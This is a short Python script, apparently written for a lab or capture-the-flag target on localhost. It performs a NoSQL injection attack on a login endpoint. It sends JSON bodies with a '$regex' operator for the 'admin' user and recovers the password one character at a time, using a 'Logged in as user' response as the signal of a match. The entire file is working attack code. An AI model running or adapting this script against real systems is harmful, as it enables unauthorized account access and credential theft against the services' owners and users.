#!/usr/bin/python3
from pwn import *
import requests, time, sys, signal, string

# function to manage CTRL+c
def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# principal function to crack
def makeNoSQLI():
    # pwn bars
    p1 = log.progress("Brute force")
    p1.status("Staring brute force process")

    time.sleep(2)

    p2 = log.progress("Password cracked")

    password_cracked = ""
    # password size
    for index in range(0, 24):
        for character in characters:
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password_cracked, character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}
            r = requests.post(target_url, headers=headers, data=post_data)

            # validate character matched
            if ("Logged in as user" in r.text):
                password_cracked += character
                p2.status(password_cracked)
                break

# CTRL+c
signal.signal(signal.SIGINT, def_handler)

# global variables
target_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

if __name__ == "__main__":
    makeNoSQLI()
